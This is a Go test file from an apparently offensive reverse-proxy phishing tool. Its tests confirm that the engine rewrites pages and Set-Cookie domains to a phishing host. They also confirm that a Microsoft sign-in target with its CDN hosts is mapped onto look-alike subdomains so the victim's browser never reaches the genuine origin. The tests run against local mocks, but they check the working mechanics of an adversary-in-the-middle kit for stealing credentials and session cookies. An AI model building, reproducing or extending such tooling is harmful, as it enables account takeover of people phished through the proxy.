package proxy

import (
	"bytes"
	"compress/gzip"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
)

// TestProxyRendersRewrittenBody pushes a gzip'd, cookie-setting HTML page from a
// mock upstream through the real Engine handler and verifies: (1) the body is
// decompressed and not corrupted, (2) origin hostnames are rewritten to the
// phishing host, (3) the TLS port is appended when non-standard, (4) Set-Cookie
// Domain is rewritten to the phishing host.
func TestProxyRendersRewrittenBody(t *testing.T) {
	mock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var buf bytes.Buffer
		gz := gzip.NewWriter(&buf)
		gz.Write([]byte(`<html><body><a href="http://` + r.Host + `/login">x</a><script src="http://` + r.Host + `/app.js"></script></body></html>`))
		gz.Close()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Content-Encoding", "gzip")
		w.Header().Set("Set-Cookie", "TOK=abc; Domain=."+r.Host+"; Path=/; Secure")
		w.Write(buf.Bytes())
	}))
	defer mock.Close()

	origin := strings.TrimPrefix(mock.URL, "http://")

	engine := NewEngine()
	engine.TLSPort = 9443
	tgt := &storage.TargetProfile{
		ID: "t", Name: "t", ProxyHost: "phish.test", Origin: origin,
		Origins: []string{origin}, Enabled: true, ForceHTTPS: false,
	}
	engine.UpsertTarget(tgt)

	h, err := engine.HandlerFor("phish.test")
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("GET", "http://phish.test/", nil)
	req.Host = "phish.test"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)

	if rec.Code != 200 {
		t.Fatalf("unexpected status %d", rec.Code)
	}
	body := rec.Body.String()
	if strings.Contains(body, origin) {
		t.Fatalf("origin not rewritten out of body: %s", body)
	}
	if !strings.Contains(body, "phish.test:9443") {
		t.Fatalf("non-standard TLS port not appended to rewritten URL: %s", body)
	}
	if c := rec.Header().Get("Set-Cookie"); !strings.Contains(c, ".phish.test") {
		t.Fatalf("Set-Cookie Domain not rewritten to phishing host: %q", c)
	}
	// Body must still be well-formed HTML (not corrupted gzip stream).
	if !strings.Contains(body, "<html>") || !strings.Contains(body, "/app.js") {
		t.Fatalf("body corrupted: %s", body)
	}
}

// TestRoutingMatrixFullChain pushes a page from a CDN-style upstream through the
// engine that was activated from a target using the new `routing_matrix`. It
// proves the multi-domain chain is wired: a request to login.ms.test is served
// from login.microsoftonline.com AND a reference to the real CDN host
// (logincdn.msauth.net) is rewritten to its phishing subdomain (logincdn.ms.test)
// so the browser never escapes to the genuine origin CDN.
func TestRoutingMatrixFullChain(t *testing.T) {
	// Two distinct CDN upstreams, mirroring logincdn.msauth.net and
	// aadcdn.msauth.net in production. Defined first so the login mock can
	// reference their origin hosts in the rewritten HTML.
	cdnLogin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/javascript")
		w.Write([]byte(`/* LOGINCDN-MARKER */`))
	}))
	defer cdnLogin.Close()
	cdnLoginOrigin := strings.TrimPrefix(cdnLogin.URL, "http://")

	cdnAad := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/javascript")
		w.Write([]byte(`/* AADCDN-MARKER */`))
	}))
	defer cdnAad.Close()
	cdnAadOrigin := strings.TrimPrefix(cdnAad.URL, "http://")

	// The login upstream serves a page that references BOTH CDN upstream hosts.
	// In a real deployment these would be logincdn.msauth.net / aadcdn.msauth.net;
	// the rewrite is keyed on whatever the matrix declares as the upstream.
	loginMock := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`<html><body><script src="https://` + cdnLoginOrigin + `/lib.js"></script><img src="https://` + cdnAadOrigin + `/a.png"></body></html>`))
	}))
	defer loginMock.Close()
	loginOrigin := strings.TrimPrefix(loginMock.URL, "http://")

	engine := NewEngine()
	engine.TLSPort = 9443
	tgt := &storage.TargetProfile{
		ID: "microsoft", Name: "Microsoft", Enabled: true, ForceHTTPS: false,
		RoutingMatrix: []storage.RouteMapping{
			{Upstream: loginOrigin, ProxyHost: "login.ms.test", IsPrimary: true},
			{Upstream: cdnLoginOrigin, ProxyHost: "logincdn.ms.test"},
			{Upstream: cdnAadOrigin, ProxyHost: "aadcdn.ms.test"},
		},
	}
	engine.UpsertTarget(tgt)

	if r, ok := engine.targetFor("login.ms.test"); !ok || r.orig != loginOrigin {
		t.Fatalf("login route not mapped to upstream: %+v", r)
	}
	if up, ok := engine.proxyToUpstream.Load("logincdn.ms.test"); !ok || up != cdnLoginOrigin {
		t.Fatalf("proxyToUpstream missing CDN entry: %v", up)
	}
	if ph, ok := engine.upstreamToProxy.Load(cdnLoginOrigin); !ok || ph != "logincdn.ms.test" {
		t.Fatalf("upstreamToProxy missing CDN entry: %v", ph)
	}

	h, err := engine.HandlerFor("login.ms.test")
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest("GET", "http://login.ms.test/", nil)
	req.Host = "login.ms.test"
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)

	if rec.Code != 200 {
		t.Fatalf("unexpected status %d", rec.Code)
	}
	body := rec.Body.String()
	if strings.Contains(body, cdnLoginOrigin) || strings.Contains(body, cdnAadOrigin) {
		t.Fatalf("CDN origin leaked into body: %s", body)
	}
	if !strings.Contains(body, "logincdn.ms.test") || !strings.Contains(body, "aadcdn.ms.test") {
		t.Fatalf("CDN references not rewritten to phishing subdomains: %s", body)
	}

	// Now fetch each CDN subdomain through the proxy; each must be served from
	// its own upstream, proving true multi-domain routing (not just the landing
	// host).
	for _, sub := range []struct {
		phish, marker string
	}{{"logincdn.ms.test", "LOGINCDN-MARKER"}, {"aadcdn.ms.test", "AADCDN-MARKER"}} {
		ch, err := engine.HandlerFor(sub.phish)
		if err != nil {
			t.Fatal(err)
		}
		creq := httptest.NewRequest("GET", "http://"+sub.phish+"/asset", nil)
		creq.Host = sub.phish
		crec := httptest.NewRecorder()
		ch.ServeHTTP(crec, creq)
		if crec.Code != 200 || !strings.Contains(crec.Body.String(), sub.marker) {
			t.Fatalf("%s not proxied to correct upstream: code=%d body=%s", sub.phish, crec.Code, crec.Body.String())
		}
	}
}
